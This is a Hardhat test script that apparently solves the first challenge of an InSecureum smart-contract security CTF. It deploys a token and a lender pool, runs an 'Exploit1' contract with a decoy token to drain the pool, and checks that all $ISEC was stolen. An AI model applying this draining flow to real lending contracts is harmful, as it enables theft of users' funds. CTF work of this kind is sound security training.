const { expect } = require("chai");
const hre = require("hardhat");
const ethers = hre.ethers;

///////////////////////////////////////////////////
/*                  CHALLENGE 1                  */
///////////////////////////////////////////////////
describe("Solve Challenge 1", function () {
  const challenger = ethers.provider.getSigner(1);

  it("Check if all of the pool's $ISEC has been stolen", async function () {
    msgstr = "\n";

    const challengerAddress = await challenger.getAddress();

    ///////////////////////////////////////////////////
    /*           Deploy Challenge Contracts          */
    ///////////////////////////////////////////////////
    const deployer = ethers.provider.getSigner(0);
    const isecTokenFactory = await ethers.getContractFactory(
      "InSecureumToken",
      deployer
    );
    const poolFactory = await ethers.getContractFactory(
      "InSecureumLenderPool",
      deployer
    );

    isecToken = await isecTokenFactory.deploy(ethers.utils.parseEther("10"));
    await isecToken.deployed();

    pool = await poolFactory.deploy(isecToken.address);
    await pool.deployed();

    await isecToken.transfer(pool.address, ethers.utils.parseEther("10"));

    isecToken = isecToken.connect(challenger);
    pool = pool.connect(challenger);

    ///////////////////////////////////////////////////
    /*        Check Status Prior to your Hack        */
    ///////////////////////////////////////////////////
    const poolPreHack = ethers.utils.formatEther(
      await isecToken.balanceOf(pool.address)
    );

    const challPreHack = ethers.utils.formatEther(
      await isecToken.balanceOf(challengerAddress)
    );

    msgstr = msgstr.concat(
      "\tPool's $ISEC balance (before your hack):\t",
      poolPreHack,
      "🪙",
      "\n",
      "\tChallenger's $ISEC balance (before your hack):\t",
      challPreHack,
      "🪙",
      "\n\n"
    );

    ///////////////////////////////////////////////////
    /*            Deploy Exploit Contracts           */
    ///////////////////////////////////////////////////

    const boringFactory = await ethers.getContractFactory(
      "BoringToken",
      deployer
    );

    const exploitFactory = await ethers.getContractFactory("Exploit1");

    boringToken = await boringFactory.deploy(ethers.utils.parseEther("10"));

    exploit = await exploitFactory.connect(challenger).deploy();

    await boringToken.transfer(pool.address, ethers.utils.parseEther("10"));

    await exploit.start(
      pool.address,
      isecToken.address,
      boringToken.address,
      ethers.utils.parseEther("10"),
      challengerAddress
    );

    ///////////////////////////////////////////////////
    /*     Check if Challenge has been solved        */
    ///////////////////////////////////////////////////

    const poolPostHack = ethers.utils.formatEther(
      await isecToken.balanceOf(pool.address)
    );

    const challPostHack = ethers.utils.formatEther(
      await isecToken.balanceOf(challengerAddress)
    );

    msgstr = msgstr.concat(
      "\tPool's $ISEC balance (after your hack):  \t",
      poolPostHack,
      "🪙",
      "\n",
      "\tChallenger's $ISEC balance (after your hack):\t",
      challPostHack,
      "🪙",
      "\n\n"
    );

    msgstr = msgstr.concat(
      "\tYou should've stolen all of the pool's $ISEC!\n\n"
    );

    expect(challPostHack === poolPreHack, msgstr).to.be.true;
  });
});
